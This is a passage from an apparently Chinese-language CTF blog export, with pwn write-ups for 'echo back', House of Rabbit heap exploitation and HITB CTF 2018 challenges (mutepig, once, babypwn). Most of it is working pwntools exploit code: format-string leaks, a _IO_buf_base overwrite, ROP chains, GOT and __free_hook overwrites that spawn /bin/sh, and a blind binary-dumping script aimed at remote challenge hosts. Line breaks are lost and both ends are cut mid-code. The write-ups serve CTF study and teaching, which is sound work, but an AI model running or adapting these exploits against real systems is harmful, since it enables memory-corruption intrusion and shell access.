p.recvuntil('Exit') p.sendline('3') p.recvuntil('get?') p.sendline('100000') p.recvuntil('something:\n') tmp = p.recvuntil('1.Find ')[:-7] if '/mem' in tmp: print '[+++] find' print tmp.split('/proc/self/mem')[0] canary = u64(tmp.split('/proc/self/mem')[0][-0x48:-0x40]) breakstack_address = stack_end - stack_guess - 24*100000 + i *100000 + len(tmp.split('/proc/self/mem')[0])if canary==0: print '[-] fail' exit(0)print '[+] canary :',hex(canary)print '[+] stack :',hex(stack_address)p.recvuntil('Exit')p.sendline('1')p.recvuntil('finding?')p.sendline('/proc/self/mem'+'\x00'*(0x18-14)+p64(stack_address-56))p.recvuntil('Exit')p.sendline('4')p.recvuntil('content')rop =p64(pie+0x0000000000001823)+p64(stack_address-56+0x100)+p64(pie+0x0000000000001821)+p64(0)+p64(0)+p64(pie+elf.symbols['open'])+p64(pie+0x0000000000001823)+p64(6)+p64(pie+0x0000000000001821)+p64(stack_address-56+0x100)+p64(stack_address-56+0x100)+p64(pie+elf.symbols['read'])+p64(pie+0x0000000000001823)+p64(stack_address-56+0x100)+p64(pie+elf.symbols['puts'])rop +='a'*(0x100-len(rop))rop += '/home/ctf/flag\0'p.sendline(rop)p.interactive()'''hex(-0x7fb165afd580 +0x7fb174d53000) 0xf255a80hex(-0x7f810afe4db0 + 0x7f811af62000) 0xff7d250hex(-0x7fe3844beeb0 + 0x7fe394428000) 0xff69150hex(-0x7f73844633a0 + 0x7f73940a9000) 0xfc45c600x0000000000001823 : pop rdi ; ret0x0000000000001821 : pop rsi ; pop r15 ; ret 00000000 23 28 99 7f 32 56 00 00 20 2f 20 00 00 00 00 00 │#(··│2V··│ / ·│····│ 00000010 00 0b 00 00 00 00 00 00 23 28 99 7f 32 56 00 00 │····│····│#(··│2V··│ 00000020 70 2f 20 00 00 00 00 00 00 0b 00 00 00 00 00 00 │p/ ·│····│····│····│ 00000030 23 28 99 7f 32 56 00 00 30 2f 20 00 00 00 00 00 │#(··│2V··│0/ ·│····│ 00000040 00 0b 00 00 00 00 00 00 0a [DEBUG] Sent 0x49 bytes: 00000000 23 28 99 7f 32 56 00 00 20 2f 20 00 00 00 00 00 │#(··│2V··│ / ·│····│ 00000010 00 0b 00 00 00 00 00 00 23 28 99 7f 32 56 00 00 │····│····│#(··│2V··│ 00000020 70 2f 20 00 00 00 00 00 00 0b 00 00 00 00 00 00 │p/ ·│····│····│····│ 00000030 23 28 99 7f 32 56 00 00 30 2f 20 00 00 00 00 00 │#(··│2V··│0/ ·│····│ 00000040 00 0b 00 00 00 00 00 00 0a │····│····│·│ 00000049[*] Switching to interactive mode: [DEBUG] Received 0x40 bytes: '/home/ctf/run.sh: line 2: 84 Segmentation fault ./house\n'/home/ctf/run.sh: line 2: 84 Segmentation fault ./house[*] Got EOF while reading in interactive$ ''' echo back此题当时没有做出来就和本科室友出去玩了… 后来回来复现了一下 漏洞分析总体来说题目逻辑简单，漏洞也比较明显——格式化字符串，但是格式化字符串的长度是有限制的： 首先利用格式化字符串可以泄露PIE、栈、libc地址。存在一个setname函数，可以由用户输入一个长度为7的值，由此步骤和格式化字符串漏洞，可以达到一个向任意地址写一个四字节或两字节或单字节的\x00。 向任意地址写单字节的\x00还是比较敏感的，在去年的WHCTF 2017 中出现过一道向_IO_buf_base末位写\x00的利用方法，但是给定的libc是libc-2.24.so，此题虽然给的是libc-2.23.so，同样利用这个方法。 漏洞利用该种利用方法利用的是文件IO中的几个指针在scanf中的应用。之前针对IO的利用也写过一些，比如House of Orange，那种利用方法比较复杂，是与堆结合，之前写过一篇丢到了看雪上：https://bbs.pediy.com/thread-223334.htm 这个攻击方法没有那么复杂，但是需要读scanf的源码。 首先scanf调用了 _IO_vfscanf ，并且提供增加了操作的文件指针stdin，这个指针很熟悉，是0号文件。其结构体是： 其中红圈内的指针是本次漏洞利用主角 继续追踪_IO_vfscanf 函数，其具体实现是内联函数_IO_vfscanf_internal，其内部实现了scanf对于格式化的操作，其中比较重要的是inchar()，这个函数是读入用户输入数据的函数。此函数最终调用了_IO_new_file_underflow进行输入，这个最底层的操作。 查看函数逻辑 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970int_IO_new_file_underflow (_IO_FILE *fp)&#123; _IO_ssize_t count;#if 0 /* SysV does not make this test; take it out for compatibility */ if (fp-&gt;_flags &amp; _IO_EOF_SEEN) return (EOF);#endif if (fp-&gt;_flags &amp; _IO_NO_READS) &#123; fp-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) return *(unsigned char *) fp-&gt;_IO_read_ptr; if (fp-&gt;_IO_buf_base == NULL) &#123; /* Maybe we already have a push back pointer. */ if (fp-&gt;_IO_save_base != NULL) &#123; free (fp-&gt;_IO_save_base); fp-&gt;_flags &amp;= ~_IO_IN_BACKUP; &#125; _IO_doallocbuf (fp); &#125; if (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED)) &#123;#if 0 _IO_flush_all_linebuffered ();#else _IO_acquire_lock (_IO_stdout); if ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF)) _IO_OVERFLOW (_IO_stdout, EOF); _IO_release_lock (_IO_stdout);#endif &#125; _IO_switch_to_get_mode (fp); fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base; fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base; fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base; count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base); if (count &lt;= 0) &#123; if (count == 0) fp-&gt;_flags |= _IO_EOF_SEEN; else fp-&gt;_flags |= _IO_ERR_SEEN, count = 0; &#125; fp-&gt;_IO_read_end += count; if (count == 0) &#123; fp-&gt;_offset = _IO_pos_BAD; return EOF; &#125; if (fp-&gt;_offset != _IO_pos_BAD) _IO_pos_adjust (fp-&gt;_offset, count); return *(unsigned char *) fp-&gt;_IO_read_ptr;&#125;libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow) 当_IO_read_ptr &lt; _IO_read_end时，函数直接返回_IO_read_ptr。反之，则会进行一系列赋值操作，最终调用read的系统调用向_IO_buf_base中读入数据。可以想到，当可以控制_IO_buf_base的值就可以达到任意地址写的目的了。 题目中可以利用是因为当覆盖为00时，指针恰好指向了stdin内部地址，并且可以再次覆写_IO_buf_base进一步造成内存任意写，而在scanf后面跟了一个getchar()函数，每次调用这个函数是会导致_IO_read_ptr++。 由于在覆写_IO_base_buf时，会造成_IO_read_end+=输入的size，不断利用getchar可以使得_IO_read_ptr逐渐增大到_IO_read_end，最终再次调用read系统调用，达到内存任意写的目的。第二次覆写_IO_buf_base的内容为函数返回地址，写入ROP即可拿到shell EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#coding:utf-8from pwn import *from ctypes import *debug = 1elf = ELF('./echo_back')if debug: p = process('./echo_back') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' #gdb.attach(p)else: p = remote('117.78.43.123', 32619) libc = ELF('./libc.so.6') #off = 0x001b0000 context.log_level = 'debug'def set_name(name): p.recvuntil('choice&gt;&gt;') p.sendline('1') p.recvuntil('name') p.send(name)def echo(content): p.recvuntil('choice&gt;&gt;') p.sendline('2') p.recvuntil('length:') p.sendline('-1') p.send(content)echo('%12$p\n')p.recvuntil('anonymous say:')stack_addr = int(p.recvline()[:-1],16)print '[+] stack :',hex(stack_addr)echo('%13$p\n')p.recvuntil('anonymous say:')pie = int(p.recvline()[:-1],16)-0xd08print '[+] pie :',hex(pie)echo('%19$p\n')p.recvuntil('anonymous say:')libc.address = int(p.recvline()[:-1],16)-240-libc.symbols['__libc_start_main']print '[+] system :',hex(libc.symbols['system'])set_name(p64(libc.address + 0x3c4918)[:-1])echo('%16$hhn')p.recvuntil('choice&gt;&gt;')p.sendline('2') p.recvuntil('length:')padding = p64(libc.address+0x3c4963)*3 + p64(stack_addr-0x28)+p64(stack_addr+0x10)p.send(padding)p.sendline('')for i in range(len(padding)-1): p.recvuntil('choice&gt;&gt;') p.sendline('2') p.recvuntil('length:') p.sendline('')p.recvuntil('choice&gt;&gt;')p.sendline('2') p.recvuntil('length:')rop = p64(pie+0x0000000000000d93)+p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system'])p.sendline(rop)p.sendline('')p.interactive()'''Gadgets information============================================================0x0000000000000d8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000000d8e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000000d90 : pop r14 ; pop r15 ; ret0x0000000000000d92 : pop r15 ; ret0x0000000000000d8b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000000d8f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000000940 : pop rbp ; ret0x0000000000000d93 : pop rdi ; ret0x0000000000000d91 : pop rsi ; pop r15 ; ret0x0000000000000d8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000000861 : ret''']]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[House Of Rabbit 原理]]></title>
    <url>%2F2018%2F04%2F18%2Fhouse-of-rabbit%2F</url>
    <content type="text"><![CDATA[House Of Rabbit是一个比较新的堆利用姿势，在满足条件的情况下，可以绕过堆块的地址随机化保护（ASLR）达到任意地址分配的目的。 所需条件 可以分配任意大小的堆块并且释放，主要包括三类fastbin大小的堆块、smallbin大小的堆块、较大的堆块（用于分配到任意地址处） 存在一块已知地址的内存空间，并可以任意写至少0x20长度的字节 存在fastbin dup、UAF等漏洞，用于劫持fastbin的fd指针。 当存在上述三个条件时，即可使用House Of Rabbit攻击方法，Rabbit的含义大概是可以JUMP到任意地址（日本人的冷幽默？？） 利用方法使用样例在此处有可以使用的样例文件，来自 shift-crops ，如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798/* PoC of House of Rabbit Tested in Ubuntu 14.04, 16.04 (64bit). Yutaro Shimizu @shift_crops 2017/09/14*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char target[0x10] = "Hello, World!";unsigned long gbuf[6] = &#123;0&#125;;int main(void)&#123; void *p, *fast, *small, *fake; char *victim; printf( "This is PoC of House of Rabbit\n" "This technique bypassing Heap ASLR without leaking address, " "and make it possible to overwrite a variable located at an arbitary address.\n" "Jump like a rabbit and get an accurate address by malloc! :)\n\n"); // 1. Make 'av-&gt;system_mem &gt; 0xa00000' printf("1. Make 'av-&gt;system_mem &gt; 0xa00000'\n"); p = malloc(0xa00000); printf(" Allocate 0xa00000 byte by mmap at %p, and free.\n", p); free(p); p = malloc(0xa00000); printf(" Allocate 0xa00000 byte in heap at %p, and free.\n", p); free(p); printf(" Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"); // 2. Free fast chunk and link to fastbins printf("2. Free fast chunk and link to fastbins\n"); fast = malloc(0x10); // any size in fastbins is ok small = malloc(0x80); printf( " Allocate fast chunk and small chunk.\n" " fast = %p\n" " small = %p\n", fast, small); free(fast); printf(" Free fast chunk.\n\n"); // 3. Make fake_chunk on .bss printf("3. Make fake_chunk on .bss\n"); gbuf[1] = 0x11; gbuf[3] = 0xfffffffffffffff1; printf( " fake_chunk1 (size : 0x%lx) is at %p\n" " fake_chunk2 (size : 0x%lx) is at %p\n\n" , gbuf[3], &amp;gbuf[2], gbuf[1], &amp;gbuf[0]); // VULNERABILITY // use after free or fastbins dup etc... fake = &amp;gbuf[2]; printf( "VULNERABILITY (e.g. UAF)\n" " *fast = %p\n" , fake); *(unsigned long**)fast = fake; printf(" fastbins list : [%p, %p, %p]\n\n", fast-0x10, fake, *(void **)(fake+0x10)); // 4. call malloc_consolidate printf( "4. call malloc_consolidate\n" " Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n" , small, fake); free(small); // 5. Link unsorted bins to appropriate list printf( "5. Link unsorted bins to appropriate list\n" " Rewrite fake_chunk1's size to 0xa0001 to bypass 'size &lt; av-&gt;system_mem' check.\n"); gbuf[3] = 0xa00001; malloc(0xa00000); printf( " Allocate huge chunk.\n" " Now, fake_chunk1 link to largebin[126](max).\n" " Then, write fake_chunk1's size back to 0xfffffffffffffff1.\n\n"); gbuf[3] = 0xfffffffffffffff1; // 6. Overwrite targer variable printf( "6. Overwrite targer variable on .data\n" " target is at %p\n" " Before : %s\n" , &amp;target, target); malloc((void*)&amp;target-(void*)(gbuf+2)-0x20); victim = malloc(0x10); printf(" Allocate 0x10 byte at %p, and overwrite.\n", victim); strcpy(victim, "Hacked!!"); printf(" After : %s\n", target);&#125; 下面对这个利用方法进行分步解析 步骤1 增大malloc函数中 mmap分配阈值当通过malloc函数分配内存时，当超过某特定阈值时，堆块会由mmap来分配，但同时会改变该阈值。具体改变和分配代码如下： 分配代码： 12345if ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp;(mp_.n_mmaps &lt; mp_.n_mmaps_max)) &#123; …… &#125; 阈值改变： 123unsigned long sum;sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;atomic_max (&amp;mp_.max_mmapped_mem, sum); 因此在第一阶段 12345678910// 1. Make 'av-&gt;system_mem &gt; 0xa00000'printf("1. Make 'av-&gt;system_mem &gt; 0xa00000'\n");p = malloc(0xa00000);printf(" Allocate 0xa00000 byte by mmap at %p, and free.\n", p);free(p);p = malloc(0xa00000);printf(" Allocate 0xa00000 byte in heap at %p, and free.\n", p);free(p);printf(" Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"); 第一次程序malloc(0xa00000)时，堆块由mmap分配，并且mp_.max_mmaped_mem变成0xa10000，当free以后再次malloc(0xa00000)时，系统会首先通过sbrk扩大top块进行分配，当最后一次free后，top大小变成0xa20c31 &gt; 0xa00000 步骤2 申请小堆块并放入fastbin首先malloc(0x20) ，再次malloc(0x80)，这两块都是由top直接切割得到，保证small bin大小的块挨着top。 123456789// 2. Free fast chunk and link to fastbinsprintf("2. Free fast chunk and link to fastbins\n");fast = malloc(0x20); // any size in fastbins is ok small = malloc(0x80);printf( " Allocate fast chunk and small chunk.\n" " fast = %p\n" " small = %p\n", fast, small);free(fast);printf(" Free fast chunk.\n\n"); 此时，对应的堆结构是： 步骤3 伪造堆块并劫持至fastbin在一个已知地址的内存处（如未开启PIE的程序BSS段）伪造两个连续的堆块，一个堆块大小是0x11，紧挨着是0xfffffffffffffff1，这样可以保证后续操作可以覆盖到任意地址。更重要的是这个0x11的小块即是大块的前块，也是大块的后块，可以保证在malloc中通过检查。 利用漏洞劫持fastbin，将大小为0xfffffffffffffff1的堆块，挂到fastbin上去。 1234567891011121314151617// 3. Make fake_chunk on .bssprintf("3. Make fake_chunk on .bss\n");gbuf[1] = 0x11; gbuf[3] = 0xfffffffffffffff1; printf( " fake_chunk1 (size : 0x%lx) is at %p\n" " fake_chunk2 (size : 0x%lx) is at %p\n\n" , gbuf[3], &amp;gbuf[2], gbuf[1], &amp;gbuf[0]);// VULNERABILITY// use after free or fastbins dup etc...fake = &amp;gbuf[2];printf( "VULNERABILITY (e.g. UAF)\n" " *fast = %p\n" , fake);*(unsigned long**)fast = fake;printf(" fastbins list : [%p, %p, %p]\n\n", fast-0x10, fake, *(void **)(fake+0x10)); 此时，堆块状态如下： 步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin在free函数中，当释放的块大于 65536时，会触发malloc_consolidate，这个函数用于对fastbin合并，并放到unsorted bin中。 触发代码如下：(malloc.c 4071) 12345678#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)... if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; if (have_fastchunks(av)) malloc_consolidate(av);... 而在malloc_consolidate()中，会循环处理各fastbin堆块，当堆块与top相邻时，与top合并。否则，将堆块放入unsorted bin中，并设置pre_size和pre_inuse位，此时较小的堆块变成 0xffffffffffffffff0 0x10 1234567891011121314151617181920212223242526272829if (nextchunk != av-&gt;top) &#123; nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; size += nextsize; unlink(av, nextchunk, bck, fwd); &#125; else clear_inuse_bit_at_offset(nextchunk, 0); first_unsorted = unsorted_bin-&gt;fd; unsorted_bin-&gt;fd = p; first_unsorted-&gt;bk = p; if (!in_smallbin_range (size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; set_head(p, size | PREV_INUSE); p-&gt;bk = unsorted_bin; p-&gt;fd = first_unsorted; set_foot(p, size);&#125;else &#123; size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p;&#125; 对应步骤代码如下： 12345// 4. call malloc_consolidateprintf( "4. call malloc_consolidate\n" " Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n" , small, fake);free(small); 步骤结束后，内存分布如下： 步骤5 分配内存 使伪造堆块进入large bin当伪造的堆块进入unsorted bin时，并不能达到目的，需要进一步使堆块进入large bin，此时需要将伪造的堆块大小改为0xa00001，其目的有两个，1是绕过程序对unsorted bin中内存块大小小于av-&gt;system_mem的检测；2是使程序放入large bin的最后一块（&gt;0x800000) malloc检测如下（malloc.c 3473） 1234567891011for (;; ) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; bck = victim-&gt;bk; if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av); size = chunksize (victim); 步骤代码如下： 123456789// 5. Link unsorted bins to appropriate list printf( &quot;5. Link unsorted bins to appropriate list\n&quot; &quot; Rewrite fake_chunk1&apos;s size to 0xa00001 to bypass &apos;size &lt; av-&gt;system_mem&apos; check.\n&quot;); gbuf[3] = 0xa00001; malloc(0xa00000); printf( &quot; Allocate huge chunk.\n&quot; &quot; Now, fake_chunk1 link to largebin[126](max).\n&quot; &quot; Then, write fake_chunk1&apos;s size back to 0xfffffffffffffff1.\n\n&quot;); gbuf[3] = 0xfffffffffffffff1; 最终，程序的堆块布局如下： 步骤6 任意内存分配当伪造堆块进入large bin最后一个队列时，将伪造堆块的大小改回0xfffffffffffffff1，此时在申请任意长度的地址，使堆块地址上溢到当前堆地址的低地址位置，从而可以分配到任意地址，达到内存任意写的目的。 12345678910111213// 6. Overwrite targer variableprintf( &quot;6. Overwrite targer variable on .data\n&quot; &quot; target is at %p\n&quot; &quot; Before : %s\n&quot; , &amp;target, target);malloc((void*)&amp;target-(void*)(gbuf+2)-0x20);victim = malloc(0x10);printf(&quot; Allocate 0x10 byte at %p, and overwrite.\n&quot;, victim);strcpy(victim, &quot;Hacked!!&quot;);printf(&quot; After : %s\n&quot;, target); 相关题目HITB CTF 2018 mutepig题目提供分配大小为0x10、0x80、0xa00000、0xffffffffffffff70大小的堆块，并且没有开启PIE保护，还存在UAF漏洞，完全满足该利用方法需求，通过将内存地址分配回bss段低地址部分的堆地址指针数组，覆写数组内容为free@got，利用编辑功能，将其内容改为system@plt，在free时可以拿到shell。 坑点在于此题没有输出，调试比较坑。另外需要注意利用方法中提到的当大堆块释放到unsorted bin时，小堆块的值会有改动。 EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding:utf-8from pwn import *import timedebug = 0elf=ELF('mutepig')if debug: p = process('./mutepig') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('47.75.128.158', 9999) #libc = ELF('./libc.so.6') context.log_level = 'debug' #libc = ELF('./libc-2.23.so') #off = 0x001b0000def add(type,content): p.sendline('1') p.sendline(str(type)) p.send(content) time.sleep(1)def free(index): p.sendline('2') p.sendline(str(index))def edit(index,content1,content2): p.sendline('3') p.sendline(str(index)) p.send(content1) p.send(content2) time.sleep(1)bss_list = 0x06020C0bss_can_be_edit = 0x602120add(3,'p4nda_0') #0free(0)add(3,'p4nda_1') #1free(1)add(1,'p4nda_2') #2add(2,'p4nda_3') #3free(2)edit(2,p64(bss_can_be_edit+0x10)[:-1],p64(0)+p64(0x11)+p64(0)+p64(0xfffffffffffffff1)+'\0'*15)free(3)edit(2,p64(0)[:-1],p64(0)+p64(0x11)+p64(0)+p64(0xA00001))add(3,'p4nda_4') #4edit(2,p64(bss_can_be_edit+0x10)[:-1],p64(0xfffffffffffffff0)+p64(0x10)+p64(0)+p64(0xfffffffffffffff1))#add(0x3419,'p4nda_5') #5add(1,p64(elf.got['free'])[:-1])edit(0,p64(elf.symbols['system'])[:-1],'/bin/sh\0')edit(6,'/bin/sh','/bin/sh\0')free(6)p.interactive() 题目]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITB CTF 2018 部分PWN题解]]></title>
    <url>%2F2018%2F04%2F17%2Fhitb2018%2F</url>
    <content type="text"><![CDATA[once此题共有四个函数，自行实现了一个类似于unsorted bin的数据结构，其结构体如下： 123456700000000 bin struc ; (sizeof=0x20, mappedto_1)00000000 field_0 dq ?00000008 field_8 dd ?0000000C field_C dd ?00000010 fd dq ?00000018 bk dq ?00000020 bin ends 其中第一个函数，是初始化函数，首先申请了一个0x20的数据块作为第一个堆块。 12345678910111213141516171819202122__int64 funtion1()&#123; __int64 v0; // ST18_8@1 bin *ptr; // rax@1 bin *mem; // ST10_8@1 __int64 result; // rax@1 __int64 v4; // rcx@1 v0 = *MK_FP(__FS__, 40LL); ptr = (bin *)malloc(0x20uLL); ptr-&gt;fd = 0LL; ptr-&gt;bk = 0LL; mem = (bin *)bss_once_mem; bss_once_mem = ptr; ptr-&gt;fd = (__int64)&amp;unk_202020; ptr-&gt;bk = (__int64)mem; mem-&gt;fd = (__int64)ptr; puts("suceess."); result = 0LL; v4 = *MK_FP(__FS__, 40LL) ^ v0; return result;&#125; 第二个函数，可以编辑上述堆块，造成可以覆写fd、bk指针， 1234567891011121314151617181920int funtion2()&#123; int result; // eax@2 __int64 v1; // rdx@4 __int64 v2; // [sp+8h] [bp-8h]@1 v2 = *MK_FP(__FS__, 40LL); if ( bss_once_flag == 1 ) &#123; result = -1; &#125; else &#123; write_(bss_once_mem, 0x20u); bss_once_flag = 1; result = puts("success."); &#125; v1 = *MK_FP(__FS__, 40LL) ^ v2; return result;&#125; 第三个函数，实现了一个unlink操作，由于第二个函数导致内存任意写 123456789101112131415161718192021int funtion3()&#123; int result; // eax@2 __int64 v1; // rcx@4 __int64 v2; // [sp+8h] [bp-8h]@1 v2 = *MK_FP(__FS__, 40LL); if ( bss_once_flag_2 == 1 ) &#123; result = -1; &#125; else &#123; bss_once_mem = (bin *)bss_once_mem-&gt;bk; bss_once_mem-&gt;fd = (__int64)&amp;unk_202020; bss_once_flag_2 = 1; result = puts("success."); &#125; v1 = *MK_FP(__FS__, 40LL) ^ v2; return result;&#125; 第四个函数中可以申请任意大的堆块，并对这个堆块申请、释放。 此题中开启了全部保护，因此无法获悉其内部任何地址。 本题解题思路是： 1 根据给定的功能泄露libc地址 2 使用1功能初始链 3 利用4功能申请一个大堆块备用 4 利用2功能，修改小堆块中的fd指针的末位字节（由于bss地址未知），使其地址指向bss段上ptr指针-0x10 5 利用3功能unlink，使bss段上ptr指针写入 PIE + 0x202020的地址 6 利用4功能中的编辑函数，由于ptr指针已被我们覆盖，因此可以对bss段上内容任意写，目的是覆盖功能2的指针及功能使用限制的标志位 7 将__free_hook覆写为system，释放堆块，得到shell EXP： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *from ctypes import *debug = 1elf = ELF('./once')#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;if debug: p = process('./once') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' gdb.attach(p)else: p = remote('47.75.189.102', 9999) libc = ELF('./libc-2.23.so') #off = 0x001b0000 context.log_level = 'debug'p.recvuntil('&gt;')p.sendline('0')p.recvuntil('Invalid choice\n')libc.address = int(p.recvuntil('&gt;')[:-1],16)-libc.symbols['puts']p.sendline('1')p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('1')p.recvuntil('size:')p.sendline(str(0xe0))p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send('a'*16+'b'*8 + chr(0x58))p.recvuntil('&gt;')p.sendline('3')p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send('/bin/sh\0'+ '\0'*0x10 + p64(libc.symbols['__free_hook']) + p64(libc.symbols['_IO_2_1_stdout_'] )+ p64(0) + p64(libc.symbols['_IO_2_1_stdin_']) + p64(0)*2 + p64(next(libc.search('/bin/sh'))) +p64(0)*4 )p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send(p64(libc.symbols['system']))p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('3')print '[*] system ',hex(libc.symbols['system'])p.interactive()#0x08048e48 : add esp, 0x1c ; ret babypwn此题题目给出的提示就是盲pwn ，通过测试可以明显分析出漏洞是格式化字符串，并且偏移是6。并且程序是64位程序，所以编写泄露脚本来dump脚本就可以了。 此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断 此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断 此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断 这一点坑了好久一直不懂为啥每次dump输出出来的内容都不对，最后dump出来后修改了几个字节读出了程序的正常逻辑： 12345678910111213141516void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; char format; // [sp+0h] [bp-110h]@2 __int64 v4; // [sp+108h] [bp-8h]@1 v4 = v28; setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); while ( 1 ) &#123; gets((__int64)&amp;format, 0LL); usleep(0); printf(&amp;format); &#125;&#125; 有了binary文件就比较简单了，通过got表可以泄露出题中给出的setbuf、gets、usleep函数地址，其中printf@got不可用，因为地址是0x601020 ，利用libc-database得到程序的libc。 最终通过修改gets@got为system及linux的并行命令拿到shell，64位的程序格式化字符串需要注意的坑点是哟啊先写字符串再加地址，否则是有截断的。 EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180#coding:utf-8from pwn import *debug = 0count = 0#HITB&#123;Baby_Pwn_BabY_bl1nd&#125;#context(arch='i386',os='linux',endian='little')now = 0if debug: p = process('./easy_pwn') libc = ELF('libc6_2.23-0ubuntu10_amd64.so') #context.kernel = 'amd64' #off = 0x001b2000 context.log_level = 'debug' #gdb.attach(p) #gdb.attach(p,'vmmap') gdb.attach(p,'b *0x804882b')else: p = remote('47.75.182.113', 9999) libc = ELF('libc6_2.23-0ubuntu10_amd64.so') context.log_level = 'debug' #libc = ELF('./libc-2.23.so') #off = 0x001b0000offset = 11def leak(str,output,addr): global now,count #p.recvuntil('Username:') #p.sendline(str) #p.recvuntil('Hello ') #if('Password') #tmp = p.recvuntil('p4nda')#recvuntil('p1e') #a = tmp[0] #if (tmp[0] == 'p') &amp; (tmp[1] == '1')&amp; (tmp[2] == 'e'): # a = '\0' #print (a) #p = remote('47.75.182.113', 9999) p.sendline(str) p.recvuntil('&lt;&lt;&lt;&lt;') tmp = p.recvuntil('&gt;&gt;&gt;&gt;') #print tmp if tmp.startswith('&gt;&gt;&gt;&gt;'): a = '\0' now += 1 else: if addr&amp;0xff == 0x0a: #print '[-] error' #exit(0) count +=1 now += 1 a = '\xf0' else: a = tmp.split('&gt;&gt;&gt;&gt;')[0] now += len(a) print a output.write(a) #p.close() #p.sendline('')def find_offset(): for i in range(1,20): str = '%%%d$x'%(i) print '[%d]'%i leak(str)def ori_file(str,output): p.recvuntil('Username:') p.sendline(str) #p.recvuntil('p4nda') p.recvuntil('Hello ') a = p.recv(1) print hex(int(a)), output.write(a) p.recvuntil('Password') p.sendline('')def find_ori(): i = 0 output = open('bin', 'wb') pro = log.progress('ori_geting') end = 0x1000 while now &lt; end: pro.status('recover:'+hex(0x400000+now)) str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x400000+now) leak(str,output,0x400000+now) ''' for i in range(0,0x1000): #find_offset() pro.status('recover:'+hex(0x400000+i)) str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x400000+i) #'%7$s'+'p1e'+'\0'+p64(0x400000+i)+'\np4nda\0\0\0'# + p32(0x8048970) leak(str,output,0x400000+i) ''' ''' for i in range(0,0x2000): #find_offset() pro.status('recover:'+hex(0x600000+i)) str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x600000+i)# + p32(0x8048970) #str = '%7$s'+'p1e'+'\0'+p64(0x600000+i)+'\np4nda\0\0\0'# + p32(0x8048970) leak(str,output,0x600000+i) ''' pro.success('get ori_file') output.close()#find_ori()def test(): 